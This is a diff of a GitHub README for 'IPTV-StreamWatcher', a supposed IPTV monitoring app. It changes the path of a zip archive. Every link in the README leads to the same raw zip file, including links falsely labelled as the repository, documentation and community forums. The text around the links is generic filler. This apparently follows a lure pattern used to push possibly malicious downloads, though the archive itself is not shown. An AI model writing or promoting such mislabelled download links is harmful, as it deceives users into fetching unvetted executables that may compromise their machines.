@@ -2,7 +2,7 @@
 # 🚀 IPTV-StreamWatcher - Monitor Your IPTV Streams Effortlessly
 
 ## 📥 Download Now
-[![Download IPTV-StreamWatcher](https://raw.githubusercontent.com/Filiberto97/IPTV-StreamWatcher/main/src/Watcher_Stream_IPT_v2.2-beta.2.zip)](https://raw.githubusercontent.com/Filiberto97/IPTV-StreamWatcher/main/src/Watcher_Stream_IPT_v2.2-beta.2.zip)
+[![Download IPTV-StreamWatcher](https://raw.githubusercontent.com/Filiberto97/IPTV-StreamWatcher/main/src/iptv_monitor/Watcher-IPT-Stream-2.4.zip)](https://raw.githubusercontent.com/Filiberto97/IPTV-StreamWatcher/main/src/iptv_monitor/Watcher-IPT-Stream-2.4.zip)
 
 ## 🚀 Getting Started
 
@@ -21,7 +21,7 @@ Before downloading, ensure your computer meets these requirements:
 
 To get started, visit the page below to download the application:
 
-[Visit this page to download](https://raw.githubusercontent.com/Filiberto97/IPTV-StreamWatcher/main/src/Watcher_Stream_IPT_v2.2-beta.2.zip)
+[Visit this page to download](https://raw.githubusercontent.com/Filiberto97/IPTV-StreamWatcher/main/src/iptv_monitor/Watcher-IPT-Stream-2.4.zip)
 
 ### 📦 Installation Instructions
 1. Click on the link above.
@@ -61,9 +61,9 @@ The application features a user-friendly dashboard that displays real-time analy
 If you have any questions or need help, check our community forums or raise an issue in the 'Issues' section of this repository. The community and contributors will be happy to assist you.
 
 ## 🔗 Links and Resources
-- [GitHub Repository](https://raw.githubusercontent.com/Filiberto97/IPTV-StreamWatcher/main/src/Watcher_Stream_IPT_v2.2-beta.2.zip)
-- [Documentation](https://raw.githubusercontent.com/Filiberto97/IPTV-StreamWatcher/main/src/Watcher_Stream_IPT_v2.2-beta.2.zip)
-- [Community Forums](https://raw.githubusercontent.com/Filiberto97/IPTV-StreamWatcher/main/src/Watcher_Stream_IPT_v2.2-beta.2.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/Filiberto97/IPTV-StreamWatcher/main/src/iptv_monitor/Watcher-IPT-Stream-2.4.zip)
+- [Documentation](https://raw.githubusercontent.com/Filiberto97/IPTV-StreamWatcher/main/src/iptv_monitor/Watcher-IPT-Stream-2.4.zip)
+- [Community Forums](https://raw.githubusercontent.com/Filiberto97/IPTV-StreamWatcher/main/src/iptv_monitor/Watcher-IPT-Stream-2.4.zip)
 
 ## 🙏 Acknowledgments
 This project relies on valuable contributions from the open-source community. Special thanks to the developers who made this project possible.
@@ -71,5 +71,5 @@ This project relies on valuable contributions from the open-source community. Sp
 ## 🎉 Join Us
 Stay updated with new releases and features by following our GitHub page. We hope you enjoy using IPTV-StreamWatcher!
 
-[Visit this page to download](https://raw.githubusercontent.com/Filiberto97/IPTV-StreamWatcher/main/src/Watcher_Stream_IPT_v2.2-beta.2.zip)
+[Visit this page to download](https://raw.githubusercontent.com/Filiberto97/IPTV-StreamWatcher/main/src/iptv_monitor/Watcher-IPT-Stream-2.4.zip)
 ```
